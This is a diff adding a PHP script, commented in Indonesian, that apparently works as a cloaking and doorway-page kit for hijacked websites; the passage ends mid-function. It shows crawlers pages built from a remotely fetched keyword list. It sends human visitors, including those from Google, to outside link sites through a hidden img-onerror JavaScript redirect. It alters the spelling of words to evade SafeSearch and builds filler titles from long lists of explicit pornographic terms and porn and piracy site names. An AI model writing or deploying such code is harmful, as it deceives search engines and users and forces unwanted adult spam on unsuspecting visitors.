@@ -1,0 +1,2135 @@
+<?php
+error_reporting(0);
+ini_set('display_errors', 0);
+header('Content-Type: text/html; charset=utf-8');
+
+// ─── Polyfill mbstring (fallback jika hosting tidak aktifkan extension) ──────
+if (!function_exists('mb_strtolower')) {
+    function mb_strtolower($str, $encoding = 'UTF-8') { return strtolower($str); }
+}
+if (!function_exists('mb_strtoupper')) {
+    function mb_strtoupper($str, $encoding = 'UTF-8') { return strtoupper($str); }
+}
+if (!function_exists('mb_strlen')) {
+    function mb_strlen($str, $encoding = 'UTF-8') { return strlen($str); }
+}
+if (!function_exists('mb_substr')) {
+    function mb_substr($str, $start, $length = null, $encoding = 'UTF-8') {
+        return $length === null ? substr($str, $start) : substr($str, $start, $length);
+    }
+}
+
+// ─── Keyword Index Helpers (fseek — tanpa load full file) ───────────────────
+// Bangun binary index: 4 byte per baris = offset byte di keyword.txt
+// Dipanggil sekali; otomatis rebuild kalau keyword.txt lebih baru dari .idx
+function buildKwIdx($kwFile) {
+    $idxFile  = $kwFile . '.idx';
+    $cntFile  = $kwFile . '.count';
+    $fh = @fopen($kwFile, 'rb');
+    $fi = @fopen($idxFile, 'wb');
+    if (!$fh || !$fi) { if ($fh) fclose($fh); if ($fi) fclose($fi); return 0; }
+    $offset = 0; $count = 0;
+    while (!feof($fh)) {
+        fwrite($fi, pack('N', $offset));          // 4 byte big-endian uint32
+        $line = fgets($fh);
+        if ($line === false) break;
+        $offset += strlen($line);
+        $count++;
+    }
+    fclose($fh); fclose($fi);
+    @file_put_contents($cntFile, $count, LOCK_EX);
+    return $count;
+}
+
+// Ambil 1 baris keyword berdasarkan nomor baris tanpa load seluruh file
+function getKwByIdx($kwFile, $lineNum) {
+    $idxFile = $kwFile . '.idx';
+    $fi = @fopen($idxFile, 'rb');
+    if (!$fi) return '';
+    fseek($fi, $lineNum * 4);
+    $raw = fread($fi, 4);
+    fclose($fi);
+    if (strlen($raw) < 4) return '';
+    $offset = unpack('N', $raw)[1];
+    $fh = @fopen($kwFile, 'rb');
+    if (!$fh) return '';
+    fseek($fh, $offset);
+    $line = fgets($fh);
+    fclose($fh);
+    return trim((string)$line);
+}
+
+// Pastikan index ada & masih fresh; return total line count
+function ensureKwIdx($kwFile) {
+    $idxFile = $kwFile . '.idx';
+    $cntFile = $kwFile . '.count';
+    if (!is_file($idxFile) || !is_file($cntFile) ||
+        filemtime($idxFile) < filemtime($kwFile)) {
+        return buildKwIdx($kwFile);
+    }
+    return (int)@file_get_contents($cntFile);
+}
+
+// ─── Mangle Word Function (top-level, reusable) ──────────────────────────────
+// 5 gaya mangle untuk bypass SafeSearch, konsisten per seed
+function mangleWord($word, $styleSeed) {
+    $style = abs(crc32($styleSeed)) % 5;
+    $chars = preg_split('//u', $word, -1, PREG_SPLIT_NO_EMPTY);
+    $len = count($chars);
+    if ($len === 0) return $word;
+    $result = '';
+    switch ($style) {
+        case 0: // rAnDoM cApS: bOkEp
+            foreach ($chars as $i => $c) {
+                $up = (abs(crc32($styleSeed . $i)) % 3) === 0;
+                $result .= $up ? mb_strtoupper($c, 'UTF-8') : mb_strtolower($c, 'UTF-8');
+            }
+            break;
+        case 1: // DOBEL huruf: bBookep
+            foreach ($chars as $i => $c) {
+                $result .= $c;
+                if ((abs(crc32($styleSeed . 'd' . $i)) % 4) === 0) {
+                    $result .= mb_strtoupper($c, 'UTF-8');
+                }
+            }
+            break;
+        case 2: // Caps depan: BOKep
+            $splitAt = max(1, abs(crc32($styleSeed . 'split')) % $len);
+            foreach ($chars as $i => $c) {
+                $result .= ($i < $splitAt) ? mb_strtoupper($c, 'UTF-8') : mb_strtolower($c, 'UTF-8');
+            }
+            break;
+        case 3: // CamelCase: BoKeP
+            foreach ($chars as $i => $c) {
+                $result .= ($i % 2 === 0) ? mb_strtoupper($c, 'UTF-8') : mb_strtolower($c, 'UTF-8');
+            }
+            break;
+        case 4: // Depan+akhir caps: BokeP
+            foreach ($chars as $i => $c) {
+                $result .= ($i === 0 || $i === $len - 1) ? mb_strtoupper($c, 'UTF-8') : mb_strtolower($c, 'UTF-8');
+            }
+            break;
+    }
+    return $result;
+}
+
+// ─── Bot Detection ────────────────────────────────────────────────────────────
+function isBot()
+{
+    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+    if ($ua === '') return true;
+    // 1 preg_match (PCRE JIT) jauh lebih cepat dari 120x stripos
+    return (bool) preg_match(
+        '/bot|spider|crawler|slurp|scraper|fetcher|checker|indexer|archiver|worm|harvest' .
+        '|scan|wget|curl|python|libwww|jakarta|java\/|httpclient|okhttp|go-http|ruby' .
+        '|googlebot|google-inspectiontool|google-read-aloud|storebot|adsbot|feedfetcher' .
+        '|apis-google|duplex|google-site|bingbot|msnbot|bingpreview|adidxbot|microsoftpreview' .
+        '|yahoo.*slurp|yandex|baiduspider|baidubox|facebookexternalhit|facebot|twitterbot' .
+        '|linkedinbot|pinterest|whatsapp|telegrambot|discordbot|slackbot|skypeuri|redditbot' .
+        '|tumblr|vkshare|w3c_validator|wechat|micromessenger|instagram|snapchat' .
+        '|ahrefsbot|semrushbot|mj12bot|dotbot|rogerbot|spbot|seznambot|petalbot|bytespider' .
+        '|blexbot|screaming.frog|sistrix|se\.ranking|dataforseo|seoscanners|linkdexbot' .
+        '|seokicks|turnitinbot|gigabot|exabot|sogou|uptime|uptimerobot|statuscake|pingdom' .
+        '|site24x7|newrelic|dynatrace|appdynamics|gtmetrix|dotcom-monitor|watchmouse|alertsite' .
+        '|archive\.org|wayback|httrack|internetarchive|webarchive' .
+        '|gptbot|chatgpt|claude-web|anthropic|cohere-ai|ccbot|omgili|perplexitybot|youbot' .
+        '|meta-external|headlesschrome|phantomjs|selenium|puppeteer|playwright|nightmare' .
+        '|slimerjs|htmlunit|zombiejs|applebot|duckduckbot|naverbot|mediapartners' .
+        '|mod_pagespeed|xing-content|linkwalker|linkidator|feedparser|feedly|feedburner' .
+        '|newsblur|plukkie|360spider|sosospider|ichiro|panscient|netcraft|worldbreeze' .
+        '|zoominfobot|shopwiki|megaindex|surferbot|domaincrawler|paperlibot|swiftbot/i',
+        $ua
+    );
+}
+
+// ─── Fetch Helper (5 cara) ────────────────────────────────────────────────────
+function fetchContent($url, $timeout = 8)
+{
+    $result = false;
+
+    // Cara 1: file_get_contents dengan context
+    if ($result === false) {
+        $ctx = stream_context_create(array(
+            'http' => array('timeout' => $timeout, 'user_agent' => 'Mozilla/5.0'),
+            'ssl'  => array('verify_peer' => false, 'verify_peer_name' => false)
+        ));
+        $data = @file_get_contents($url, false, $ctx);
+        if ($data !== false && trim($data) !== '') $result = $data;
+    }
+
+    // Cara 2: cURL
+    if ($result === false && function_exists('curl_init')) {
+        $ch = curl_init($url);
+        curl_setopt_array($ch, array(
+            CURLOPT_RETURNTRANSFER => 1, CURLOPT_TIMEOUT => $timeout,
+            CURLOPT_CONNECTTIMEOUT => 5, CURLOPT_FOLLOWLOCATION => 1,
+            CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_USERAGENT => 'Mozilla/5.0'
+        ));
+        $res = @curl_exec($ch);
+        $ok  = !curl_error($ch) && curl_getinfo($ch, CURLINFO_HTTP_CODE) === 200;
+        curl_close($ch);
+        if ($ok && $res !== false && trim($res) !== '') $result = $res;
+    }
+
+    // Cara 3: file_get_contents sederhana (tanpa context)
+    if ($result === false) {
+        $data = @file_get_contents($url);
+        if ($data !== false && trim($data) !== '') $result = $data;
+    }
+
+    // Cara 4: fsockopen
+    if ($result === false) {
+        $p = parse_url($url);
+        $host = isset($p['host']) ? $p['host'] : '';
+        $port = (isset($p['scheme']) && $p['scheme'] === 'https') ? 443 : 80;
+        $path = isset($p['path']) ? $p['path'] : '/';
+        $prefix = (isset($p['scheme']) && $p['scheme'] === 'https') ? 'ssl://' : '';
+        $fp = @fsockopen($prefix . $host, $port, $errno, $errstr, $timeout);
+        if ($fp) {
+            fwrite($fp, "GET {$path} HTTP/1.1\r\nHost: {$host}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n");
+            $raw = '';
+            while (!feof($fp)) $raw .= fgets($fp, 4096);
+            fclose($fp);
+            $parts = explode("\r\n\r\n", $raw, 2);
+            if (isset($parts[1]) && trim($parts[1]) !== '') $result = $parts[1];
+        }
+    }
+
+    // Cara 5: stream_socket_client
+    if ($result === false) {
+        $p = parse_url($url);
+        $host = isset($p['host']) ? $p['host'] : '';
+        $port = (isset($p['scheme']) && $p['scheme'] === 'https') ? 443 : 80;
+        $path = isset($p['path']) ? $p['path'] : '/';
+        $scheme = (isset($p['scheme']) && $p['scheme'] === 'https') ? 'ssl://' : 'tcp://';
+        $ctx = stream_context_create(array('ssl' => array('verify_peer' => false, 'verify_peer_name' => false)));
+        $sock = @stream_socket_client($scheme . $host . ':' . $port, $errno, $errstr, $timeout, STREAM_CLIENT_CONNECT, $ctx);
+        if ($sock) {
+            fwrite($sock, "GET {$path} HTTP/1.1\r\nHost: {$host}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n");
+            $raw = '';
+            while (!feof($sock)) $raw .= fread($sock, 4096);
+            fclose($sock);
+            $parts = explode("\r\n\r\n", $raw, 2);
+            if (isset($parts[1]) && trim($parts[1]) !== '') $result = $parts[1];
+        }
+    }
+
+    return $result;
+}
+
+// ─── 404 Page ─────────────────────────────────────────────────────────────────
+function send404()
+{
+    header('HTTP/1.1 404 Not Found');
+    include dirname(__FILE__) . '/abouts.php';
+    exit;
+}
+
+// ─── Keyword Match ────────────────────────────────────────────────────────────
+// Cek apakah ada keyword dari GET (products/category/index) atau path
+$getParams = array('products', 'category', 'index');
+$hasProducts = false;
+foreach ($getParams as $gp) {
+    if (isset($_GET[$gp])) { $hasProducts = true; break; }
+}
+
+// ─── Baca keyword: dari ?products= / ?category= / ?index= ATAU dari path /keyword ───
+$rawSlug = '';
+foreach ($getParams as $gp) {
+    if (!empty($_GET[$gp])) {
+        $rawSlug = trim($_GET[$gp]);
+        break;
+    }
+}
+if ($rawSlug === '') {
+    $path = trim(parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH), '/');
+    // Support /index.php/keyword format
+    if (stripos($path, 'index.php/') === 0) {
+        $path = substr($path, strlen('index.php/'));
+    }
+    // Support /keyword-title-slug.html format
+    // Juga support /keyword.html sederhana
+    if (substr($path, -5) === '.html' && $path !== 'amp.html') {
+        $path = substr($path, 0, -5);
+    }
+    if ($path !== '' && $path !== 'index.php') {
+        $rawSlug = $path;
+    }
+}
+
+$incomingSlug = str_replace(' ', '-', mb_strtolower(rawurldecode($rawSlug), 'UTF-8'));
+$_isBot = isBot(); // memoize — dipanggil sekali, dipakai 2x
+
+// ─── Root URL tanpa keyword ──────────────────────────────────────────────────
+// Manusia → tampilkan abouts.php | Bot → pilih keyword random dari daftar
+$isRootAccess = ($incomingSlug === '');
+if ($isRootAccess && !$_isBot) {
+    // Manusia akses root → tampilkan abouts.php
+    // Jika datang dari Google, inject redirect dulu
+    $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
+    if (stripos($referer, 'google.') !== false) {
+        $rootRedirectUrls = array('https://yuklink.me/gogogogo/', 'https://yuklink.me/gogogogo/');
+        $rootRedirectUrl = $rootRedirectUrls[array_rand($rootRedirectUrls)];
+        echo '<img src="/static/images/d4fdf41d5g.png" onerror=window.location="' . $rootRedirectUrl . '">';
+    }
+    include dirname(__FILE__) . '/abouts.php';
+    exit;
+}
+
+// ─── Keyword Load & Brand Match ──────────────────────────────────────────────
+// Deteksi URL sitemap_indo: slug mengandung '/' (3-level path: prefix/video/filename)
+$isIndoUrl = (strpos($incomingSlug, '/') !== false);
+
+$kwLocalPaths = array(
+    dirname(__FILE__) . '/keyword.txt',
+    dirname(__FILE__) . '/index.txt',
+);
+$kwLocalFile = '';
+foreach ($kwLocalPaths as $src) {
+    if (is_file($src)) { $kwLocalFile = $src; break; }
+}
+
+// ── Helper: fetch keyword.txt dari remote jika lokal tidak ada ───────────────
+function fetchAndSaveKeyword($kwLocalPaths) {
+    $kwRemote = 'https://joingroup-id.com/seo/keyword.txt';
+    $kwData   = false;
+
+    // Cara 1: file_get_contents dengan context
+    if ($kwData === false) {
+        $ctx = stream_context_create(array('http' => array('timeout' => 8, 'user_agent' => 'Mozilla/5.0'),
+            'ssl' => array('verify_peer' => false, 'verify_peer_name' => false)));
+        $kwData = @file_get_contents($kwRemote, false, $ctx);
+    }
+    // Cara 2: cURL
+    if (($kwData === false || trim($kwData) === '') && function_exists('curl_init')) {
+        $ch = curl_init($kwRemote);
+        curl_setopt_array($ch, array(CURLOPT_RETURNTRANSFER => 1, CURLOPT_TIMEOUT => 10,
+            CURLOPT_CONNECTTIMEOUT => 5, CURLOPT_FOLLOWLOCATION => 1,
+            CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_USERAGENT => 'Mozilla/5.0'));
+        $res = @curl_exec($ch);
+        $ok  = !curl_error($ch) && curl_getinfo($ch, CURLINFO_HTTP_CODE) === 200;
+        curl_close($ch);
+        if ($ok && $res !== false) $kwData = $res;
+    }
+    // Cara 3: file_get_contents sederhana
+    if ($kwData === false || trim($kwData) === '') {
+        $kwData = @file_get_contents($kwRemote);
+    }
+    // Cara 4: fsockopen
+    if ($kwData === false || trim($kwData) === '') {
+        $p = parse_url($kwRemote);
+        $host = $p['host']; $port = ($p['scheme'] === 'https') ? 443 : 80;
+        $path = isset($p['path']) ? $p['path'] : '/';
+        $fp = @fsockopen(($p['scheme'] === 'https' ? 'ssl://' : '') . $host, $port, $errno, $errstr, 8);
+        if ($fp) {
+            fwrite($fp, "GET {$path} HTTP/1.1\r\nHost: {$host}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n");
+            $raw = '';
+            while (!feof($fp)) $raw .= fgets($fp, 1024);
+            fclose($fp);
+            $parts = explode("\r\n\r\n", $raw, 2);
+            if (isset($parts[1]) && trim($parts[1]) !== '') $kwData = $parts[1];
+        }
+    }
+    // Cara 5: stream_socket_client
+    if ($kwData === false || trim($kwData) === '') {
+        $p = parse_url($kwRemote);
+        $host = $p['host']; $port = ($p['scheme'] === 'https') ? 443 : 80;
+        $path = isset($p['path']) ? $p['path'] : '/';
+        $scheme = ($p['scheme'] === 'https') ? 'ssl://' : 'tcp://';
+        $ctx = stream_context_create(array('ssl' => array('verify_peer' => false, 'verify_peer_name' => false)));
+        $sock = @stream_socket_client($scheme . $host . ':' . $port, $errno, $errstr, 8, STREAM_CLIENT_CONNECT, $ctx);
+        if ($sock) {
+            fwrite($sock, "GET {$path} HTTP/1.1\r\nHost: {$host}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n");
+            $raw = '';
+            while (!feof($sock)) $raw .= fread($sock, 1024);
+            fclose($sock);
+            $parts = explode("\r\n\r\n", $raw, 2);
+            if (isset($parts[1]) && trim($parts[1]) !== '') $kwData = $parts[1];
+        }
+    }
+
+    if ($kwData !== false && trim($kwData) !== '') {
+        $saveTo = dirname($kwLocalPaths[0]) . '/keyword.txt';
+        @file_put_contents($saveTo, $kwData, LOCK_EX);
+        return $saveTo;
+    }
+    return false;
+}
+
+$BRAND   = '';
+$NUMLIST = 0;
+
+// ── Fast path: root atau sitemap_indo — gunakan fseek index, tanpa load full file ──
+if ($isRootAccess || $isIndoUrl) {
+    if ($kwLocalFile === '') {
+        $saved = fetchAndSaveKeyword($kwLocalPaths);
+        if ($saved === false) {
+            header('HTTP/1.1 500 Internal Server Error');
+            exit('Error 500: Gagal memuat keyword.txt.');
+        }
+        $kwLocalFile = $saved;
+    }
+    $totalKw = ensureKwIdx($kwLocalFile);
+    if ($totalKw <= 0) {
+        header('HTTP/1.1 500 Internal Server Error');
+        exit('Error 500: Gagal membangun keyword index.');
+    }
+
+    if ($isRootAccess) {
+        $rootSeed = $_SERVER['HTTP_HOST'] . '|root-keyword';
+        $kwIdx    = abs(crc32($rootSeed)) % $totalKw;
+        $kw       = getKwByIdx($kwLocalFile, $kwIdx);
+        $BRAND    = strtoupper($kw);
+        $NUMLIST  = $kwIdx + 1;
+        $incomingSlug = str_replace(' ', '-', mb_strtolower($kw, 'UTF-8'));
+    } else {
+        // sitemap_indo URL
+        $indoIdx  = abs(crc32($_SERVER['HTTP_HOST'] . '|indo|' . $incomingSlug)) % $totalKw;
+        $BRAND    = strtoupper(getKwByIdx($kwLocalFile, $indoIdx));
+        $NUMLIST  = $indoIdx + 1;
+    }
+} else {
+    // ── Normal keyword URL — load full file, exact + prefix match ────────────
+    if ($kwLocalFile !== '') {
+        $content = @file_get_contents($kwLocalFile);
+    } else {
+        $saved = fetchAndSaveKeyword($kwLocalPaths);
+        if ($saved === false) {
+            header('HTTP/1.1 500 Internal Server Error');
+            exit('Error 500: Gagal memuat keyword.txt.');
+        }
+        $kwLocalFile = $saved;
+        $content = @file_get_contents($kwLocalFile);
+    }
+    if ($content === false || trim($content) === '') {
+        header('HTTP/1.1 500 Internal Server Error');
+        exit('Error 500: keyword.txt kosong.');
+    }
+
+    $allKeywords = array();
+    foreach (explode("\n", $content) as $ln) {
+        $ln = trim($ln);
+        if ($ln !== '') $allKeywords[] = $ln;
+    }
+    unset($content); // bebaskan RAM segera
+
+    // Exact match
+    foreach ($allKeywords as $i => $line) {
+        $slug = str_replace(' ', '-', mb_strtolower(rawurldecode($line), 'UTF-8'));
+        if ($slug === $incomingSlug) {
+            $BRAND   = strtoupper($line);
+            $NUMLIST = $i + 1;
+            break;
+        }
+    }
+
+    // Prefix match (tanpa usort — cari longest match dalam 1 loop)
+    if ($BRAND === '') {
+        $bestLen = 0; $bestBrand = ''; $bestNum = 0; $bestSlug = '';
+        foreach ($allKeywords as $i => $line) {
+            $slug = str_replace(' ', '-', mb_strtolower(rawurldecode($line), 'UTF-8'));
+            $slen = strlen($slug);
+            if ($slug !== '' && $slen > $bestLen && strpos($incomingSlug, $slug . '-') === 0) {
+                $bestLen = $slen; $bestBrand = strtoupper($line);
+                $bestNum = $i + 1; $bestSlug = $slug;
+            }
+        }
+        if ($bestBrand !== '') {
+            $BRAND = $bestBrand; $NUMLIST = $bestNum; $incomingSlug = $bestSlug;
+        }
+    }
+
+    // Fallback: slug tidak ada di keyword.txt (seharusnya tidak terjadi di jalur ini)
+    if ($BRAND === '' && $incomingSlug !== '') {
+        $totalKw = count($allKeywords);
+        if ($totalKw > 0) {
+            $indoIdx = abs(crc32($_SERVER['HTTP_HOST'] . '|indo|' . $incomingSlug)) % $totalKw;
+            $BRAND   = strtoupper($allKeywords[$indoIdx]);
+            $NUMLIST = $indoIdx + 1;
+        } else {
+            send404();
+        }
+    } elseif ($BRAND === '') {
+        send404();
+    }
+}
+
+// ─── Siapkan redirect trick untuk manusia ────────────────────────────────────
+$redirectUrls = array('https://join.linkhub.fit/', 'https://join.linkhub.fit/XE0MtJ/');
+$redirectUrl = $redirectUrls[array_rand($redirectUrls)];
+$redirectTag = !$_isBot
+    ? '<img src="/static/images/d4fdf41d5g.png" onerror=window.location="' . $redirectUrl . '">'
+    : '';
+
+// ─── Build variables ──────────────────────────────────────────────────────────
+$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
+$fullUrl = $protocol . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+$parsed = parse_url($fullUrl);
+
+$parsedScheme = isset($parsed['scheme']) ? $parsed['scheme'] : '';
+$parsedHost = isset($parsed['host']) ? $parsed['host'] : '';
+$parsedPath = isset($parsed['path']) ? $parsed['path'] : '';
+$parsedQuery = isset($parsed['query']) ? $parsed['query'] : '';
+
+$urlPath = $parsedScheme . '://' . $parsedHost . $parsedPath . ($parsedQuery !== '' ? '?' . $parsedQuery : '');
+
+date_default_timezone_set('UTC');
+$timestamp = date('Y-m-d\TH:i:s\Z');
+
+$_sp    =& _sp(); // init pool statis (emojis/words/lokasi tersedia)
+$emojis =& $_sp['emojis'];
+$domainSeed = $_SERVER['HTTP_HOST'] . '|' . $incomingSlug;
+// Pilih dari pool $emojis lalu langsung mangle untuk bypass SafeSearch
+$_emojiSource = $emojis[abs(crc32($domainSeed)) % 325];
+$_emojiParts = explode(' ', $_emojiSource);
+$_emojiMangled = array();
+foreach ($_emojiParts as $_ek => $_eWord) {
+    $_emojiMangled[] = mangleWord($_eWord, $domainSeed . 'em' . $_ek);
+}
+$randomEmoji = implode(' ', $_emojiMangled);
+
+$words  =& $_sp['words'];
+// ─── Junk Text Generator ─────────────────────────────────────────────────────
+// Generate structured random text yang terlihat profesional, konsisten per domain+keyword
+function generateJunkText($seed) {
+    static $baseWords, $status, $quality, $type, $extra, $wrappers;
+    if (!isset($baseWords)) {
+    // Words untuk di-mangle (acak huruf besar/kecil, dobel huruf, dll)
+    $baseWords = array(
+        // ─── Situs besar internasional ─────────────────
+        'xnxx', 'xvideos', 'pornhub', 'xhamster', 'redtube', 'youporn',
+        'brazzers', 'bangbros', 'naughtyamerica', 'realitykings',
+        'mofos', 'digitalplayground', 'teamskeet', 'wicked', 'kink',
+        'onlyfans', 'stripchat', 'chaturbate', 'bongacams', 'cam4',
+        'spankbang', 'drtuber', 'slutload', 'tube8', 'extrabig',
+        'beeg', 'hclips', 'faphouse', 'sexvid', 'porn300',
+        'youjizz', 'tnaflix', 'sunporno', 'txxx', 'nuvid',
+        'tubegalore', 'pornone', 'fuq', 'lobstertube', 'thumbzilla',
+        'porntrex', 'sxyprn', 'daftsex', 'porndoe', 'eporner',
+        'porngo', 'tubepornclassic', 'porndig', 'anyporn', 'hdporn',
+        'vporn', 'empflix', 'motherless', 'alohatube', 'myvidster',
+        'cliphunter', 'fantasti', 'pornmd', 'nudevista', 'indexxx',
+
+        // ─── Kata kunci umum ──────────────────────────
+        'xxx', 'sex', 'porn', 'video', 'bokep', 'hot', 'bf', 'hd',
+        'viral', 'leaked', 'live', 'cam', 'full', 'new', 'film', 'clip',
+        'streaming', 'download', 'watch', 'free', 'online', 'terbaru',
+        'jav', 'hentai', 'adult', 'tube', 'hub', 'red', 'big', 'amateur',
+        'premium', 'private', 'exclusive', 'uncensored', 'raw', 'real',
+        'trending', 'scandal', 'expose', 'tape', 'record', 'scene',
+        'nude', 'naked', 'strip', 'topless', 'bikini', 'lingerie', 'cosplay',
+        'fetish', 'hardcore', 'softcore', 'erotic', 'sensual', 'explicit',
+
+        // ─── Lokal / Indo ─────────────────────────────
+        'indo', 'asia', 'japan', 'korea', 'barat', 'blue', 'semi',
+        'bokep', 'mesum', 'ngentot', 'syur', 'panas', 'cabul', 'senonoh',
+        'jilbab', 'hijab', 'abg', 'sma', 'mahasiswa', 'ojol', 'spg',
+        'artis', 'selebgram', 'tiktoker', 'youtuber', 'influencer',
+        'pelakor', 'selingkuh', 'skandal', 'amatir', 'rumahan',
+        'warung', 'hotel', 'kamar', 'kantor', 'pijat', 'salon',
+        'bigo', 'telegram', 'twitter', 'tiktok', 'simontok',
+        'nonton', 'gratis', 'tanpa sensor', 'sub indo', 'terbaru',
+        'viral', 'trending', 'populer', 'terhot', 'terlaris',
+        'lk21', 'indoxxi', 'layarkaca', 'rebahin', 'bioskopkeren',
+        'drakorindo', 'samehadaku', 'oploverz', 'kusonime', 'otakudesu',
+
+        // ─── Kategori / Niche ─────────────────────────
+        'milf', 'teen', 'mature', 'stepmom', 'stepsister', 'stepbro',
+        'massage', 'casting', 'interracial', 'gangbang', 'threesome',
+        'lesbian', 'gay', 'trans', 'bisex', 'solo', 'couple',
+        'creampie', 'blowjob', 'handjob', 'facial', 'cumshot',
+        'anal', 'oral', 'doggy', 'missionary', 'cowgirl', 'reverse',
+        'squirt', 'orgasm', 'climax', 'moan', 'scream', 'wild',
+        'rough', 'gentle', 'romantic', 'passionate', 'intense',
+        'public', 'outdoor', 'shower', 'pool', 'beach', 'car',
+        'office', 'school', 'gym', 'hospital', 'hotel', 'toilet',
+    );
+
+    $status = array(
+        'LEAKED', 'VIRAL', 'TRENDING', 'EXCLUSIVE', 'HOT', 'NEW', 'BREAKING', 'EXPOSED',
+        'UNCENSORED', 'PREMIUM', 'PRIVATE', 'BANNED', 'ORIGINAL', 'UNCUT', 'RESTRICTED',
+        'SHOCKING', 'CONFIRMED', 'DELETED', 'HIDDEN', 'SECRET', 'UNDERGROUND', 'FORBIDDEN',
+        'CLASSIFIED', 'UNSEEN', 'RARE', 'LIMITED', 'VIP', 'UPDATED', 'FRESH', 'LATEST',
+        'EXPLOSIVE', 'SENSATIONAL', 'BOMBSHELL', 'SCANDALOUS', 'CONTROVERSIAL', 'URGENT',
+        'ALERT', 'WARNING', 'BLOCKED', 'REMOVED', 'SUPPRESSED', 'UNLOCKED', 'CRACKED',
+        'DECODED', 'REVEALED', 'DISCOVERED', 'UNMASKED', 'BUSTED', 'CAUGHT', 'INTERCEPTED',
+        'RECOVERED', 'SALVAGED', 'RESTORED', 'RELOADED', 'UPGRADED', 'BOOSTED', 'AMPLIFIED',
+        'SUPERCHARGED', 'TURBO', 'MEGA', 'ULTRA', 'HYPER', 'SUPREME', 'ELITE', 'PLATINUM',
+    );
+    $quality = array(
+        'HD', '4K', 'Full', 'HQ', '1080p', 'UHD', '720p', 'HiRes', 'BluRay', 'HDRip',
+        '8K', '2160p', '4320p', 'IMAX', 'Dolby', 'HDR', 'HDR10', 'DTS', 'FLAC', 'Lossless',
+        'Remux', 'WEB-DL', 'WEBRip', 'BDRip', 'DVDRip', 'CAMRip', 'TS', 'HC', 'PROPER',
+        'REPACK', 'x264', 'x265', 'HEVC', 'AVC', 'AAC', 'MP4', 'MKV', 'AVI', '60fps',
+        '120fps', 'Hi10P', 'MultiSub', 'DualAudio', 'Surround', '5.1ch', '7.1ch', 'Atmos',
+        'Crystal', 'Pristine', 'Premium', 'Studio', 'Master', 'Reference', 'Definitive',
+    );
+    $type = array(
+        'Video', 'Clip', 'Movie', 'Film', 'Stream', 'Live', 'Tape', 'Content', 'Footage',
+        'Recording', 'Episode', 'Scene', 'Reel', 'Show', 'Broadcast', 'Upload', 'Post',
+        'Story', 'Highlight', 'Compilation', 'Montage', 'Collection', 'Archive', 'Dump',
+        'Bundle', 'Pack', 'Series', 'Season', 'Chapter', 'Volume', 'Part', 'Segment',
+        'Feature', 'Documentary', 'Special', 'Bonus', 'Extra', 'BTS', 'Behind The Scenes',
+        'Trailer', 'Teaser', 'Preview', 'Sneak Peek', 'Premiere', 'Debut', 'Release',
+        'Cut', 'Version', 'Edition', 'Remake', 'Remaster', 'Redux', 'Directors Vision',
+    );
+    $extra = array(
+        '2026', '2025', '18+', 'XXX', 'Unfiltered', 'RAW', 'Real', 'Official', 'Complete',
+        'Extended', 'Remastered', 'Directors Cut', 'No Sensor', 'Terbaru', 'Latest',
+        'Verified', 'Authentic', 'Legit', 'Genuine', 'Certified', '100%', 'Guaranteed',
+        'No Fake', 'No Clickbait', 'Must See', 'Dont Miss', 'Watch Now', 'Download Now',
+        'Free Access', 'Unlimited', 'No Ads', 'No VPN', 'Direct Link', 'Fast Server',
+        'Mirror', 'Backup', 'Alt Link', 'Working Link', 'Updated Link', 'New Link',
+        'Sub Indo', 'English Sub', 'Multi Sub', 'Dubbed', 'Raw', 'Hardsub', 'Softsub',
+        'Part 1', 'Part 2', 'Part 3', 'Full Length', 'Unedited', 'Uncropped', 'Widescreen',
+        'April 2026', 'Mei 2026', 'Juni 2026', 'Hot 2026', 'Trending 2026', 'Best 2026',
+        'Top Rated', 'Most Viewed', 'Most Popular', 'Editor Pick', 'Staff Pick', 'Award Winning',
+    );
+
+    $wrappers = array(
+        '[%s]', '++%s++', '>>%s<<', '*%s*', '(%s!)', '★%s★', '【%s】', '「%s」',
+        '{%s}', '▶%s◀', '◆%s◆', '⚡%s⚡', '→%s←', '|%s|', '-%s-',
+        '《%s》', '〖%s〗', '『%s』', '◈%s◈', '✦%s✦', '⊹%s⊹', '▪%s▪',
+        '■%s■', '▣%s▣', '♦%s♦', '●%s●', '◉%s◉', '⊙%s⊙', '☆%s☆',
+        '※%s※', '†%s†', '‡%s‡', '⁂%s⁂', '⊕%s⊕', '⊗%s⊗', '⊘%s⊘',
+        '〔%s〕', '⟦%s⟧', '⟪%s⟫', '⦃%s⦄', '⦗%s⦘',
+        '#%s#', '~%s~', '=%s=', '::%s::', '//%s//', '!!%s!!', '??%s??',
+        '+*%s*+', '-=%s=-', '>>>[%s]<<<', '[[%s]]', '((%s))', '{{%s}}',
+    ); // end $wrappers
+    } // end static guard
+    // mangleWord() global tersedia di atas — tidak perlu closure lokal
+
+    $h = abs(crc32($seed . 'junk'));
+
+    // 3 pola output berbeda
+    $pattern = $h % 3;
+
+    if ($pattern === 0) {
+        // Pola 1: [STATUS] mangledWord1 mangledWord2 mangledWord3 quality type extra
+        $wrapper = $wrappers[abs(crc32($seed . 'jw')) % 54];
+        $s = $status[abs(crc32($seed . 'js')) % 65];
+        $w1 = $baseWords[abs(crc32($seed . 'bw1')) % 228];
+        $w2 = $baseWords[abs(crc32($seed . 'bw2')) % 228];
+        $w3 = $baseWords[abs(crc32($seed . 'bw3')) % 228];
+        $q = $quality[abs(crc32($seed . 'jq')) % 54];
+        $t = $type[abs(crc32($seed . 'jt')) % 53];
+        $e = $extra[abs(crc32($seed . 'je')) % 66];
+
+        $parts = array(sprintf($wrapper, $s));
+        $parts[] = mangleWord($w1, $seed . 'm1');
+        $parts[] = mangleWord($w2, $seed . 'm2');
+        $parts[] = mangleWord($w3, $seed . 'm3');
+        $parts[] = $t;
+        if (abs(crc32($seed . 'addq')) % 2 === 0) $parts[] = $q;
+        if (abs(crc32($seed . 'adde')) % 3 === 0) $parts[] = $e;
+        return implode(' ', $parts);
+
